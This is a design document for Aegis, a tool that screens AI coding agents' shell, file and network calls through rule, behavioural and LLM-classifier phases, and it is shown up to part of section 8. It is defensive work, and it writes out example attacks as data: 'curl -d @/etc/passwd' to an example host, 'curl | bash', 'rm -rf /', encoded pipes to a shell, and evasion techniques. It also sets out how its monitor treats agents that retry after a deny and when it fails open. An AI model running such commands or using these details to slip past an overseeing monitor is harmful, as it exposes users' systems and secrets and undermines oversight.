# Aegis Design Document

> Deep technical reference for contributors, reviewers, and architects.
> Ground truth: the code in `pkg/aegis/`. When in doubt, read the source.

---

## Table of Contents

1. [Design Philosophy](#1-design-philosophy)
2. [Architecture Overview](#2-architecture-overview)
3. [Signal System Design](#3-signal-system-design)
4. [Rule Engine Design](#4-rule-engine-design)
5. [Bloom Filter Fast-Path](#5-bloom-filter-fast-path)
6. [Session State and Behavioral Analysis](#6-session-state-and-behavioral-analysis)
7. [LLM Intent Classification (Phase 3)](#7-llm-intent-classification-phase-3)
8. [Integration Architecture](#8-integration-architecture)
9. [Allowlist Design](#9-allowlist-design)
10. [Eval Methodology](#10-eval-methodology)
11. [Key Tradeoffs](#11-key-tradeoffs)
12. [Threat Model](#12-threat-model)

---

## 1. Design Philosophy

### Evaluate Actions, Not Stated Intent

The fundamental insight behind Aegis is that AI agents cannot be trusted at the intention layer. An agent can be manipulated through prompt injection in the files it reads, can hallucinate confident justifications for destructive operations, or can be directed by a compromised system prompt. Evaluating what the agent *says* it wants to do — or inspecting the prompt that generated the tool call — provides no meaningful security boundary.

Aegis evaluates *actions*: the concrete tool calls the agent actually issues. `rm -rf /` is dangerous regardless of the agent's stated rationale. A `curl` command posting data to an unknown external host is suspicious regardless of whether the agent explains it as "deployment." This is the same principle that makes network firewalls inspect packets rather than the sender's motivation.

The practical consequence: Aegis parses shell commands to AST, expands variable references, strips privilege-escalation wrappers, and classifies the resulting concrete operation. No amount of natural-language justification in the agent's output changes what the command will actually do.

### Defense-in-Depth: Cheap Checks First

Security operations have costs. A bloom filter lookup costs ~100ns. Static rule evaluation costs ~50µs. Behavioral analysis with session state costs ~1ms. LLM classification costs ~200ms and real money. Running the expensive path on every request would either break latency budgets or bankrupt operators.

Aegis solves this with a three-phase cascade that gates on confidence. Each phase is cheap enough that it never dominates; the expensive phases activate only for the fraction of requests that cheaper phases cannot resolve. The bloom filter handles the common case (known-benign repeated commands) in nanoseconds. Phase 1 static rules resolve the vast majority of remaining cases in microseconds. Only requests that survive with low confidence proceed to Phase 2 behavioral analysis, and only persistent uncertainty triggers Phase 3 LLM classification.

This is not just an optimization: it is a security design. An attacker who crafts inputs designed to confuse the classifier will trigger Phase 3 escalation, not bypass. Unparseable commands fall through to ESCALATE rather than ALLOW.

### Fail-Secure on Uncertainty, Fail-Open on Errors

These two policies are distinct and both intentional.

**Fail-secure on uncertainty**: When the engine cannot determine whether a request is safe, the conservative answer is deny. This manifests as ESCALATE rather than ALLOW for ambiguous cases, as DENY when the LLM classifier times out (rule `llm_timeout`), and as the default behavior when no rule explicitly matches a shell command (rule `default_uncertain_shell` escalates; `default_allow` only fires for non-shell tools).

**Fail-open on errors**: When the security layer itself fails — parse errors, engine panics, daemon unavailability — Aegis allows the request through rather than breaking the developer's workflow. The hook binary uses `recover()` to catch panics and writes a `panic_recovered` event to the WAL before writing allow. Parse errors write `aegis: parse error (fail-open)` to stderr and allow. Daemon unreachability falls back to inline Phase 1 evaluation rather than blocking.

The reasoning: a security tool that randomly blocks legitimate work gets disabled. The fail-open behavior for infrastructure errors preserves developer trust, while the fail-secure behavior for uncertain-but-evaluable inputs maintains security posture. An attacker cannot trigger fail-open by crafting a suspicious command — fail-open only activates on genuine infrastructure failures, not on policy uncertainty.

### Separation of Scoring from Decisions

`CompositeScore` in `pkg/aegis/signals/types.go` is explicitly documented: "This number is NOT used for decisions — only for dashboards." The weights are:

```
composite = ToolClass×0.15 + MaxVerbDanger×0.25 + MaxPathRisk×0.25
          + NetworkScore×0.15 + DLPScore×0.10 + EvasionScore×0.10
```

This composite appears in every `Decision` struct for observability — operators can see why a request scored high — but no rule reads it. Decisions are made by boolean predicates in `Phase1Rules()` and `BehavioralEvaluate()` that inspect raw signal fields directly. This separation has two consequences:

1. Rules are auditable: "deny if `b.DLP.HasHit && !b.DLP.AllTest`" is easy to reason about and test; "deny if composite > 0.73" is not.
2. Rules are not gameable by tuning one signal to pull the composite below a threshold while leaving another signal dangerous.

---

## 2. Architecture Overview

### Three-Phase Cascade with Confidence Gating

The engine (`pkg/aegis/engine.go`) runs requests through phases in sequence, short-circuiting when confidence is sufficient:

- **Fast path** (Phase 0): Bloom filter check (~100ns). Known-benign requests return `fast_path_allow` immediately. Allowlist check runs next — project-specific or user-level exceptions.
- **Phase 1** (static rules, <50µs): Computes all six signals from the raw tool call using the AST-only extractor, then evaluates `Phase1Rules()` in priority order. If the matched rule has `Confidence >= 0.85`, the decision is final.
- **Phase 2** (behavioral, <1ms): Activates when Phase 1 confidence falls below 0.85. Recomputes signals with the full extractor (which may include dry-run), then reads session state to compute `BehavioralSignal`. `BehavioralEvaluate()` checks for retry-after-deny, known exfiltration sequences, rate bursts, and baseline deviation. Results with `Confidence >= 0.75` are final.
- **Phase 3** (LLM intent, ~200ms): Activates only when Phase 1 or 2 produces an ESCALATE action. The LLM classifier receives the tool call plus up to 5 recent session entries as context. Fail-secure timeout at 500ms returns DENY.

```mermaid
flowchart TD
    ToolCall["Tool Call (shell/file/network)"] --> Bloom{"Bloom Filter\n~100ns"}
    Bloom -->|"hit (known-benign)"| Allow1[ALLOW]
    Bloom -->|miss| Allowlist{"Allowlist\ncheck"}
    Allowlist -->|match| Allow2[ALLOW]
    Allowlist -->|no match| Phase1["Phase 1: Static Rules\n6 signals, <50us"]
    Phase1 -->|"confidence >= 0.85"| Final1{Decision}
    Phase1 -->|"confidence < 0.85"| Phase2["Phase 2: Behavioral\nsession state, <1ms"]
    Phase2 -->|"confidence >= 0.75"| Final2{Decision}
    Phase2 -->|ESCALATE| Phase3["Phase 3: LLM Intent\nGPT-4o-mini/Haiku, ~200ms"]
    Phase3 --> Final3{Decision}
    Final1 --> Allow3[ALLOW]
    Final1 --> Deny1[DENY]
    Final1 --> Escalate1[ESCALATE]
    Final2 --> Allow4[ALLOW]
    Final2 --> Deny2[DENY]
    Final3 --> Allow5[ALLOW]
    Final3 --> Deny3[DENY]
    Final3 -->|"timeout/error"| FailSecure[DENY]
```

### Latency Budget

| Phase | Target | Mechanism |
|-------|--------|-----------|
| Bloom filter | ~100ns | In-memory bit array, xxhash double-hashing |
| Allowlist check | ~1µs | Linear scan over small YAML-loaded lists |
| Phase 1 static rules | <50µs | AST-only extractor + sorted rule evaluation |
| Phase 2 behavioral | <1ms | Full extractor + ring buffer reads + sequence matching |
| Phase 3 LLM | ~200ms | Remote LLM API call, 500ms hard timeout |

The latency budget matters because Aegis sits on every tool call. A 200ms overhead is invisible against the 2-10 second latency of the LLM inference that generated the tool call; a 200ms overhead on every `ls` would make Aegis intolerable. The cascade ensures Phase 3 is rare.

### Why Cascading Beats a Single Classifier

A single ML classifier would have three problems that cascading solves:

1. **Latency**: Even a lightweight model has 10-50ms inference time. Running it on every `ls` command is wasteful.
2. **Cost**: LLM inference has monetary cost. Running Phase 3 on routine reads would be prohibitively expensive.
3. **Explainability**: When a rule fires, `Decision.Rule` names the exact rule and `Decision.Evidence` lists the specific signals. An ML score is opaque; a rule name is auditable.

---

## 3. Signal System Design

### Why Six Independent Signals

The six signals — ToolClass, Command, Path, Network, DLP, Evasion — are designed to be independently computable and composable. No signal knows about the others during extraction; they are all computed from the same raw inputs (tool name + args JSON + CWD) by separate functions and assembled into a `SignalBundle`.

Independence provides three properties:

1. **Composability**: Rules can express conditions like "dangerous verb AND sensitive path AND evasion detected" without coupling signal extractors.
2. **Testability**: Each signal extractor has its own unit tests against known inputs. Adding a new DLP pattern does not require retesting path analysis.
3. **No single point of failure**: A command with a benign verb but a sensitive path target is caught by the Path signal even if the Command signal shows low danger. There is no single signal whose miscalibration defeats detection.

```mermaid
flowchart LR
    Input["Raw Tool Call"] --> Extractor["AST Extractor\n(mvdan.cc/sh)"]
    Extractor --> S1["ToolClass\n0.02-0.70"]
    Extractor --> S2["Command\nverb danger table"]
    Extractor --> S3["Path\ncritical/sensitive/project"]
    Extractor --> S4["Network\nhost + intent"]
    Extractor --> S5["DLP\ncredential patterns"]
    Extractor --> S6["Evasion\nencoding/substitution"]
    S1 --> Bundle["SignalBundle"]
    S2 --> Bundle
    S3 --> Bundle
    S4 --> Bundle
    S5 --> Bundle
    S6 --> Bundle
    Bundle --> Rules["Rule Engine\npriority-ordered first-match"]
    Rules --> Verdict["Action + Confidence"]
```

### Signal 1: ToolClass (`pkg/aegis/signals/tool_class.go`)

`ClassifyTool()` maps the tool name to a category and base risk score using a static lookup table. Categories and their scores:

| Category | Score | Example tools |
|----------|-------|---------------|
| `shell` | 0.60 | shell, bash, run_command, execute_command |
| `file_delete` | 0.70 | delete, file_delete, delete_file |
| `file_write` | 0.30 | write, file_write, create_file, edit, strreplace |
| `file_read` | 0.05 | read, file_read, cat, read_file |
| `search` | 0.02 | glob, grep, find, search |
| `network_read` | 0.15 | webfetch, websearch |
| `unknown` | 0.40 | anything unrecognized |

The design rationale: shell tools warrant higher base risk because they can invoke arbitrary binaries; the effective danger depends on what binary gets invoked, which is determined by the Command signal. The `unknown` score of 0.40 is deliberately moderate — high enough to avoid auto-allow, low enough to let other signals determine the outcome. Rules that apply only to shell tools check `b.ToolClass.Category == "shell"` explicitly.

### Signal 2: Command (`pkg/aegis/signals/command.go`)

`AnalyzeCommand()` uses the `mvdan.cc/sh` AST extractor to parse the shell command and extract a list of `ResolvedCommand` structs. Each struct captures the binary name, full path (for detecting `/tmp/`-based execution), args, and wrappers stripped.

The `verbDangerTable` maps ~70 binary names to danger scores. Key design decisions in the table:

- `rm`: 0.80. Destructive but common; the Path signal determines whether the target is critical.
- `curl`/`wget`: 0.20 base, boosted to 0.70 when `hasDataFlag()` returns true. The base score allows read-only fetches; the boost catches exfiltration.
- `nc`/`ncat`/`socat`/`telnet`: 0.85. Raw socket tools have almost no legitimate use in AI agent workflows.
- `sudo`/`su`/`pkexec`/`doas`: 0.70. Privilege escalation wrappers; the privilege_escalation rule handles these separately.
- `git`/`npm`/`pip`: 0.05. Development tools so common that high base risk would generate false positives.
- `python`/`bash`/`sh`: 0.35. Scripting interpreters can execute arbitrary code, so they carry moderate base risk.

The `HasDataFilePattern()` function detects `@file` data upload patterns in curl arguments (e.g., `curl -d @/etc/passwd`), which propagate these paths into the Path signal via `extraPaths`.

### Signal 3: Path (`pkg/aegis/signals/path.go`)

`AnalyzePathsFromArgs()` collects paths from tool arguments and delegates to `AnalyzePaths()`. Each path is normalized (`filepath.Clean`, `~` expansion) before classification, which is the traversal-resistance mechanism.

`classifyPath()` produces a (risk, critical, sensitive) triple:

- **Critical paths**: `/dev/`, `/proc/`, `/sys/`, `/etc/`, `/usr/`, `/bin/`, `/sbin/`, `/boot/`, `/lib/`, `/System/`, `/private/etc/`, `/private/var/`. Risk 0.80-0.95.
- **Sensitive files**: `shadow`, `sudoers`, `passwd`, SSH private keys (`id_rsa`, `id_ed25519`, etc.), `/.ssh/`, `/.aws/credentials`, `/.kube/config`, `.env`, `.pem`, `private_key`, `credentials.json`. Risk 0.75-0.95.
- **Low-risk paths**: `/tmp/` (0.10), build artifact directories like `node_modules/`, `dist/`, `target/` (0.03), relative paths (0.05).
- **Unknown absolute paths**: 0.20.

`isInProject()` walks up from CWD looking for a `.git` directory (cached in `projectRootCache`) to determine the project root. Relative paths are always considered in-project. Paths outside the project root have `InProject = false`, which rules use to distinguish writing to a project's own `.env` (allowed) from writing to system files (denied).

`PathSignal.AllInProject` is true only when every extracted path is within the project root. Rules use this as a bulk check: `b.Path.AllInProject` implies no path escapes the project boundary.

### Signal 4: Network (`pkg/aegis/signals/network.go`)

`AnalyzeNetworkFromExtracted()` builds network signal from commands that are network binaries (`curl`, `wget`, `scp`, `rsync`, `nc`, `ncat`, `socat`, `telnet`, `ftp`, `sftp`, `ssh`). Hosts are extracted only from these commands to avoid false positives from the shell extractor's `looksLikeHost` heuristic.

Host classification: each `AnalyzedHost` is marked `IsInternal` (localhost, `.local`, `.internal`, RFC1918 IPs, loopback) or `IsKnownSafe` (hardcoded registry set: `github.com`, `npmjs.org`, `pypi.org`, `pkg.go.dev`, `crates.io`, etc., plus subdomains).

`computeNetworkScore()` applies a risk matrix:

| Operation | Hosts | Score |
|-----------|-------|-------|
| Read (no data flag) | All known-safe | 0.05 |
| Read | All internal | 0.10 |
| Read | Mixed trusted | 0.10 |
| Read | Any unknown | 0.30 |
| Write (data flag) | Stdin pipe | 0.90 |
| Write | Unknown + data flag | 0.85 |
| Write | Unknown, no data flag | 0.60 |
| Write | Internal | 0.25 |
| Write | All known-safe | 0.20 |

The distinction between read and write operations (`HasDataFlag` or `HasStdinPipe`) is critical: `curl https://example.com` is read, low risk; `curl -d @/etc/passwd https://example.com` is write, high risk.

### Signal 5: DLP (`pkg/aegis/signals/dlp.go`)

`ScanDLP()` extracts all string values from the args JSON (recursively, via `collectStrings()`) and scans their concatenation against 13 credential patterns:

| Provider | Pattern example |
|----------|----------------|
| AWS | `AKIA[0-9A-Z]{16}` |
| GitHub | `ghp_[a-zA-Z0-9]{36}`, `ghs_`, `github_pat_` |
| Stripe | `sk_live_[a-zA-Z0-9]{24,}` |
| OpenAI | `sk-[a-zA-Z0-9]{48,}` |
| Anthropic | `sk-ant-[a-zA-Z0-9\-]{40,}` |
| Google | `AIza[0-9A-Za-z\-_]{35}` |
| Slack | `xoxb-`, `xoxp-` |
| Twilio | `AC[a-z0-9]{32}` |
| SendGrid | `SG\.[...]{22}\.[...]{43}` |
| Private key | `-----BEGIN ... PRIVATE KEY-----` |

Each pattern has an optional `testPattern` to identify known-fake credentials (e.g., `AKIAIOSFODNN7EXAMPLE`). The `isTestCredential()` function also checks `testMarkers` substrings: `placeholder`, `example`, `test`, `fake`, `dummy`, `sample`, etc.

`DLPSignal.AllTest` is true when every hit is a test credential. The `secret_leakage` rule fires only when `b.DLP.HasHit && !b.DLP.AllTest` — genuine credentials in args, not documentation examples.

The design choice to scan args JSON rather than only the command string means DLP catches credentials passed as environment variables, flag values, JSON body content, or any other argument field, not just inline in the command text.

### Signal 6: Evasion (`pkg/aegis/signals/evasion.go`)

`AnalyzeEvasion()` detects techniques that attackers use to disguise malicious commands from pattern-matching defenses:

| Technique | Detection | Score contribution |
|-----------|-----------|-------------------|
| Wrapper stripping | `sudo`, `env`, `nohup`, `timeout`, `nice`, `ionice` stripped from `cmd.Wrappers` | +0.10 per wrapper (max 0.30) |
| Variable expansion hiding danger | `$VAR = 'rm'` pattern | +0.40 if vars expanded AND dangerous verb revealed |
| Shell recursion | `bash -c 'sh -c ...'` pattern | +0.20 if depth > 1 |
| Encoding piped to shell | `base64 -d \| bash`, `curl \| bash` | +0.50 |
| Command substitution | `$(rm -rf /)`, backtick danger verbs | +0.30 |

The score is clamped to [0, 1]. The `remote_code_execution` rule in Phase 1 fires when `b.Evasion.EncodingDetected` is true — `curl | bash` is always denied regardless of the URL, because the download-and-execute pattern is independently dangerous even when the URL appears benign.

---

## 4. Rule Engine Design

### Priority-Ordered First-Match Semantics

`Evaluate()` in `pkg/aegis/rules/engine.go` sorts rules by `Priority` (ascending) using `sort.SliceStable` and returns the first matching rule. This is iptables semantics: rules are tried in order, and the first match wins. No subsequent rules are evaluated.

`sort.SliceStable` (rather than `sort.Slice`) guarantees deterministic behavior when two rules share the same priority — they evaluate in source-order within the slice returned by `Phase1Rules()`.

### Why First-Match Over Weighted Voting or Ensemble

Weighted voting would allow a moderate-risk verb + moderate-risk path + moderate-risk network score to sum past a threshold without any single signal being clearly dangerous. This creates two problems:

1. **Gameable**: An attacker can stay below any individual threshold while combining multiple moderate signals.
2. **Non-explainable**: "Your request scored 0.73 against a 0.70 threshold" is harder to explain to users than "Rule `data_exfiltration` fired because curl has a data flag targeting a sensitive path."

First-match semantics give each rule a name that appears in `Decision.Rule` and in audit logs. Post-incident forensics can identify exactly which pattern triggered the block. Rule confidence scores reflect empirical calibration (1.0 - FPR on the eval corpus) rather than a learned weight.

### Priority Bands

Phase 1 rules (`pkg/aegis/rules/phase1.go`) are organized into three bands:

**DENY rules (priorities 10-22)**:

| Priority | Rule | Trigger |
|----------|------|---------|
| 10 | `critical_path_destruction` | rm/mkfs/dd/fdisk/shred targeting critical paths |
| 11 | `system_control` | shutdown/reboot/halt/poweroff |
| 12 | `raw_socket_open` | nc/ncat/socat/telnet |
| 13 | `privilege_escalation` | passwd/visudo/sudo wrapping interpreter/elevated verb |
| 14 | `critical_path_write` | file_write/file_delete to critical or sensitive paths |
| 15 | `secret_leakage` | DLP hit with non-test credential |
| 16 | `sensitive_file_access` | Reading sensitive files via file_read or shell |
| 17 | `data_exfiltration` | curl/wget/scp with data flag to sensitive path or stdin pipe |
| 18 | `remote_code_execution` | Encoding detected (curl\|bash, base64\|sh) |
| 19 | `suid_manipulation` | chmod +s or chmod 4xxx |
| 20 | `cron_persistence` | crontab -e/-r or writing to /etc/cron* |
| 21 | `bashrc_persistence` | Writing .bashrc/.profile with network or encoding content |
| 22 | `execute_from_tmp` | Binary or script executed from /tmp or /var/tmp |

**ALLOW rules (priorities 50-66)**:

| Priority | Rule | Trigger |
|----------|------|---------|
| 50 | `benign_read_only` | file_read or search, all paths in project |
| 51 | `benign_safe_shell` | All verbs are in a safe set, no sensitive targets, no DLP |
| 52 | `benign_package_mgr` | npm/pip/cargo/yarn/brew/apt/etc. |
| 53 | `benign_go_ops` | go build/test/mod/get/fmt/vet/etc. |
| 54 | `benign_build_tools` | make/cmake/gradle/mvn/tsc/gcc/rustc/etc. |
| 54 | `benign_project_rm` | rm only on artifact directories within project |
| 55 | `benign_docker_ops` | docker/kubectl/helm without privileged flags |
| 56 | `benign_test_run` | pytest/jest/mocha/go test/cargo test/etc. |
| 57 | `benign_git_ops` | git with safe subcommands |
| 58-66 | Additional allow rules | Network reads, scp/rsync deployment, local chmod, etc. |

**ESCALATE rules (priorities 90-100)**:

| Priority | Rule | Trigger |
|----------|------|---------|
| 90 | `evasion_with_danger` | Evasion score > 0.3 AND max verb danger > 0.7 |
| 91 | `unknown_network_write` | Network score > 0.5, no known-safe or internal hosts |
| 92 | `shell_no_rule_matched` | Shell tool, max verb danger > 0.30, no earlier match |
| 99 | `default_uncertain_shell` | Any shell tool call that reached this priority |
| 100 | `default_allow` | Non-shell tools not matched by any earlier rule |

The design implication: a shell tool call that doesn't match any specific DENY or ALLOW rule eventually reaches `default_uncertain_shell` (priority 99) with confidence 0.50, which triggers Phase 2 evaluation. Non-shell tools reach `default_allow` at priority 100 — the engine assumes file and network MCP tools are lower risk and requires specific signal hits to deny them.

### Confidence Thresholds as Phase-Escalation Gates

The confidence field on each rule is the gate that determines whether the decision is final or proceeds to the next phase:

- Phase 1 confidence >= 0.85: final (no Phase 2)
- Phase 1 confidence < 0.85: proceed to Phase 2
- Phase 2 confidence >= 0.75: final (no Phase 3) — `BehavioralEvaluate` returns a rule directly
- Phase 2 action == ESCALATE: proceed to Phase 3

In practice, all DENY rules at priorities 10-22 have confidence 0.88-0.99, so they terminate at Phase 1. The ALLOW rules at 50-66 have confidence 0.80-0.99, also terminating at Phase 1. Only the ESCALATE rules at 90-99 (confidence 0.50-0.85) proceed to Phase 2.

Phase 2 behavioral rules (`pkg/aegis/rules/phase2.go`) have fixed confidence values: `retry_after_deny` fires at 0.92, `session_fits_baseline` fires at 0.85, `sudden_tool_shift` fires at 0.70. These are all above 0.75, so they always terminate at Phase 2.

---

## 5. Bloom Filter Fast-Path

### Why a Bloom Filter

The bloom filter in `pkg/aegis/bloom/filter.go` implements a fast-path allow for requests that are provably known-benign. A bloom filter can produce false positives (a request appears in the filter but was not actually added) but never false negatives (a request in the filter always returns true).

This asymmetry is exactly right for a fast-path allow:
- **False positives are harmless**: A request incorrectly identified as "in the filter" proceeds to the normal evaluation pipeline via Phase 1. There is no security consequence.
- **False negatives are impossible**: A known-benign request that was actually added will always be recognized. The fast path is never incorrectly skipped.

The filter is initialized with `bloom.New(1000, 0.01)` — sized for 1000 expected items with a 1% false positive rate. This translates to approximately 9585 bits and 7 hash functions (optimal k computed from the classical formulas).

Double hashing uses `xxhash.Sum64` with a rotated seed (`h2 = xxhash.Sum64(append(key, 0xff))`), producing two independent 64-bit hashes for the double-hashing technique. The guard `if h2 == 0 { h2 = 1 }` prevents degenerate behavior where all probes target the same bit.

### Corpus Seeding

`WithBenignCorpus()` and `loadBenignCorpus()` seed the filter from `testdata/eval/benign.jsonl` and `testdata/eval/benign-native.jsonl`. Each line is unmarshalled to extract tool name and arguments, then keyed via `bloom.CanonicalKey()`.

`CanonicalKey()` sorts argument keys before JSON-marshalling to ensure key order does not create distinct entries for semantically identical requests. Large string values (over 200 characters) are truncated to 50 characters to prevent file-content arguments from inflating key length.

The engine searches default corpus paths at startup if no explicit path is provided:

```go
"testdata/eval/benign.jsonl"
"testdata/eval/benign-native.jsonl"
filepath.Join(exeDir, "../../testdata/eval/benign.jsonl")
```

### Cache Invalidation

The bloom filter is not persisted to disk and is rebuilt from the corpus on every engine initialization. This is intentional: the corpus grows over time as new benign patterns are validated; stale filter state would be worse than no filter (false negatives in the corpus). The rebuild cost at startup is negligible — scanning 132 lines of JSONL and computing hashes takes microseconds.

The filter has no TTL or invalidation mechanism during engine lifetime. Benign patterns added to the corpus mid-run would require an engine restart to take effect, which is acceptable because the fast path is an optimization, not a security boundary.

---

## 6. Session State and Behavioral Analysis

### Ring Buffer Design

`session.State` in `pkg/aegis/session/state.go` maintains two fixed-size ring buffers:

```go
calls  [100]ToolCall  // last 100 tool calls
denies [50]DenyEvent  // last 50 deny events
```

Both use head-pointer arithmetic for O(1) push. The `callHead` and `denyHead` indices advance with wrap-around modulo the buffer length. `callCount` and `denyCount` track how many entries are valid (up to the buffer size), allowing correct window-based queries before the buffer fills.

This design provides bounded memory: a session never exceeds 100 × sizeof(ToolCall) + 50 × sizeof(DenyEvent) ≈ ~50KB, regardless of how long the session runs or how many tool calls are made.

`RecentCalls(n)` and `RecentDenies(window)` read backwards from the head, returning calls in chronological order. The ring buffer read pattern ensures O(n) access for the n most recent calls without requiring a sorted data structure.

### Baseline Computation

After 5 minutes of session traffic, `Record()` computes a baseline tool distribution:

```go
if !s.baselineSet && time.Since(s.StartTime) > 5*time.Minute {
    // normalize toolCounts to a probability distribution
    for tool, count := range s.toolCounts {
        s.baseline[tool] = float64(count) / float64(total)
    }
    s.baselineSet = true
}
```

This captures the agent's normal tool-use pattern during a warmup period. `computeBaselineDeviation()` then computes cosine distance between the baseline distribution and the distribution of the last 20 calls:

```
deviation = 1 - cosine_similarity(baseline, recent)
```

where cosine similarity = dot_product / (||baseline|| × ||recent||). A deviation of 0 means the recent distribution is identical to baseline; 1 means orthogonal (entirely different tools being used).

The `BehavioralEvaluate` rule `sudden_tool_shift` fires when `BaselineDeviation > 0.7` combined with high network activity or critical path access — the combination of "doing something completely different than normal AND it involves sensitive operations" is a strong signal.

The `session_fits_baseline` rule (Phase 2 allow) only fires when `BaselineEstablished` is true. This prevents an attacker who starts a fresh session from immediately triggering baseline-based allowances.

### Retry-After-Deny Detection

`DenyEvent` captures the `PrimaryVerb` of denied calls. When a new call arrives:

```go
if lastDenyVerb != "" && lastDenyTimeAgo < 60*time.Second {
    if currentVerb == lastDenyVerb || equivalentVerb(currentVerb, lastDenyVerb) {
        sig.RetryAfterDeny = true
    }
}
```

`equivalentVerb()` groups semantically equivalent verbs: `{rm, rmdir, shred, unlink}`, `{curl, wget, fetch}`, `{nc, ncat, netcat, socat}`, `{python, python3, py}`, `{bash, sh, zsh}`. An agent that tries `curl` after being denied for `wget` within 60 seconds triggers retry detection, because the semantic intent is the same.

Retry-after-deny fires as Phase 2 rule at priority 200 with confidence 0.92 — this is a near-certain signal that the agent is actively attempting to circumvent the policy.

### Sequence Pattern Matching

`matchSequences()` in `pkg/aegis/signals/behavioral.go` implements three multi-step attack patterns:

**`exfil_after_sensitive_read`**: Network write (data flag or network score > 0.5) within 30 seconds of a history entry with `PathSensitive = true`. Sequence risk 0.90. This catches the classic read-then-exfiltrate pattern.

**`escalating_access`**: Current request accesses a critical path AND there are 2+ prior critical path accesses in the last 2 minutes. Sequence risk 0.60. This catches reconnaissance loops where the agent iterates over system files.

**`encoded_exfil`**: Network write (data flag) within 60 seconds of both a sensitive file read AND a base64/xxd command in the summary. Sequence risk 0.85. This catches the encode-then-exfiltrate pattern.

### Risk Trend

`computeRiskTrend()` runs simple linear regression over the last 20 `CompositeScore` values:

```
slope = Σ(i - mean_i)(score_i - mean_score) / Σ(i - mean_i)²
```

A positive slope means the agent's requests are trending toward higher risk scores. This feeds into `BehavioralSignal.EscalationGradient`, which contributes `gradient × 0.2` to the composite behavioral score when the gradient exceeds 0.1.

---

## 7. LLM Intent Classification (Phase 3)

### Activation Condition

Phase 3 activates in `engine.Evaluate()` only when the final action from Phase 1 or Phase 2 is `ActionEscalate` and an `intentClassifier` is wired in. If no classifier is configured (the default for the hook binary in inline mode), ESCALATE decisions are returned as-is.

The classifier is configured via `WithIntentClassifier()` and is typically only enabled in the daemon, which has persistent connections and can amortize rate-limiter state across requests.

### Rate Limiting

The `Classifier` in `pkg/aegis/intent/classifier.go` uses a token-bucket rate limiter (`rateLimiter`) with a configurable maximum calls per minute (default 10). The `Allow()` method checks and decrements the token count under a mutex, resetting to `max` when a minute has elapsed.

Rate limiting serves two purposes:
1. **Cost control**: LLM API calls cost money. Unbounded Phase 3 calls would be expensive in attack scenarios designed to trigger ESCALATE on every request.
2. **Fail-secure on budget exhaustion**: When the budget is exceeded, `Classify()` returns an error, which the engine handles as `ActionDeny` (rule `llm_timeout`).

### Fail-Secure Timeout

The classifier context has a hard 500ms timeout:

```go
ctx, cancel := context.WithTimeout(ctx, c.timeout)
defer cancel()
```

Any LLM call that exceeds 500ms returns an error, which propagates to the engine as `Decision{Action: ActionDeny, Rule: "llm_timeout", Confidence: 0.60}`. The security guarantee: Phase 3 can never extend evaluation indefinitely or block on a slow/unavailable API.

### Phase 3 Decision Rules

`applyPhase3Rules()` maps LLM output to decisions:

| LLM output | Condition | Result |
|------------|-----------|--------|
| `malicious` + confidence > 0.8 | — | DENY, rule `llm_malicious`, confidence 0.90 |
| `suspicious` + confidence > 0.8 | — | ESCALATE, rule `llm_suspicious_high`, confidence 0.75 |
| `legitimate` + confidence > 0.8 | — | ALLOW, rule `llm_legitimate`, confidence 0.85 |
| Any other | — | DENY, rule `llm_uncertain`, confidence 0.65 |

The LLM receives a structured prompt that includes: tool name, serialized arguments, up to 5 recent session entries with elapsed time, and optional project language. The prompt constrains output to `{"intent": "...", "confidence": 0.0-1.0, "reasoning": "..."}` JSON. Invalid JSON or unexpected intent values return an error, which the engine treats as DENY.

### Model Choice Rationale

The default model is `gpt-4o-mini` (or Claude Haiku if `ANTHROPIC_API_KEY` is set). The choice of small, fast models is deliberate:

1. **Latency**: Security decisions that take >2 seconds block the developer's workflow. Small models typically respond in 200-500ms.
2. **Cost**: Phase 3 is meant to be rare. The cost difference between GPT-4o and GPT-4o-mini is 20x; at 10 calls/minute max, either is affordable, but smaller models reduce the cost of rate-limit abuse.
3. **Classification simplicity**: The Phase 3 task is a three-way classification with structured context, not a complex reasoning problem. Small models perform well on structured classification.
4. **Determinism**: `temperature: 0` ensures the same tool call produces the same classification on repeated calls.

### Why LLM Is Last Resort

The LLM is last resort rather than first because:

1. **Non-determinism**: Even at temperature 0, API models can change behavior between versions. A security boundary with non-deterministic behavior is hard to reason about and impossible to unit-test exhaustively.
2. **Latency**: 200ms on every tool call would make Aegis unusable for interactive development.
3. **Cost**: Operating costs must remain predictable.
4. **Correctness of earlier phases**: For clearly dangerous commands (rm -rf /, curl|bash) and clearly safe commands (git status, ls), the static and behavioral rules have 0.95+ confidence. LLM adds value only in the ambiguous middle — commands that look unusual for the current session but might be legitimate.

---

## 8. Integration Architecture

### Hook Binary Design

The `cmd/hook/` binary is the primary integration point for Cursor and Claude Code. It reads exactly one JSON object from stdin, evaluates it, and writes exactly one JSON object to stdout. It is stateless per-invocation: no persistent connections, no shared memory between invocations.

Cursor invokes the hook binary for three event types:

- `beforeShellExecution`: `{"command": "...", "cwd": "..."}`
- `preToolUse`: `{"tool": "...", "input": {...}, "cwd": "..."}`
- `beforeMCPExecution`: `{"serverName": "...", "tool": "...", "input": {...}, "cwd": "..."}`

`parseHookInput()` normalizes these three formats into `normalizedRequest{Tool, Arguments, CWD}`. The `serverName` format prefixes the tool name with `MCP:{serverName}:` to namespace MCP tool calls.

Hook output format:

```json
{"permission": "allow"}
{"permission": "deny", "user_message": "...", "agent_message": "..."}
```

`user_message` is displayed to the developer; `agent_message` is fed back to the agent. The agent message includes the rule name and severity so the agent can adjust its behavior.

### Why Fail-Open on Hook Errors

The hook binary uses multiple fail-open paths:

```go
// Empty input: fail-open
if err != nil || len(strings.TrimSpace(string(input))) == 0 {
    writeAllow()
    return
}

// Parse error: fail-open
req, err = parseHookInput(input)
if err != nil {
    fmt.Fprintln(os.Stderr, "aegis: parse error (fail-open):", err)
    writeAllow()
    return
}

// Panic recovery: fail-open
defer func() {
    if r := recover(); r != nil {
        writeAllow()
    }
}()
```

The rationale is developer experience and adoption. Aegis is a security layer on top of existing IDE workflows. If it fails closed on every error — including malformed input from unexpected IDE events, engine bugs in edge cases, or temporary resource exhaustion — developers will disable it. Fail-open on errors keeps the developer's workflow unimpacted while the errors are logged and fixed.

Security is not compromised by this choice: the fail-open paths activate on infrastructure errors, not on policy uncertainty. A dangerous command that produces a well-formed request will be evaluated correctly.

### Daemon vs. Inline Evaluation

The hook binary tries the daemon first via `tryDaemon()`, then falls back to inline Phase 1:

```go
func evaluate(req *normalizedRequest) *aegis.Decision {
    if d := tryDaemon(req); d != nil {
        return d
    }
    return evalInline(req)
}
```

